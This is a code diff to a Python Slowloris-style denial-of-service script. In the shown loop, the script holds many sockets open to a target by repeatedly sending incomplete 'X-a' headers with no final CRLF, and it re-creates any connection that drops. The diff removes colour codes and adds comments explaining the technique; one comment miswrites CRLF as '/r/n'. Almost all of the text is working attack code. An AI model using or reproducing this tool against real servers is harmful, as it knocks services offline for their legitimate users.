@@ -92,18 +92,22 @@ if __name__ == "__main__":
         sockets.append(s)
 
     while True:
-        print(
-            "\033[1;34;40mSending Keep-Alive Headers with {} sockets".format(len(sockets)))
+        # Prints 
+        print("Sending Keep-Alive Headers with {} sockets".format(len(sockets)))
 
         for s in sockets:
             try:
+                # Send random data WITHOUT two CRLF: '/r/n'
                 s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
+                
             except socket.error:
+                # If the socket fails to keep connection, remove it.
                 sockets.remove(s)
 
         for _ in range(num_sockets - len(sockets)):
-            print("\033[1;34;40m{}Re-creating Socket...".format("\n"))
+            print("{}Re-creating Socket...".format("\n"))
             try:
+                # Try recreating connect that was was terminated
                 s = gen_socket(ip, is_https)
                 if s:
                     sockets.append(s)
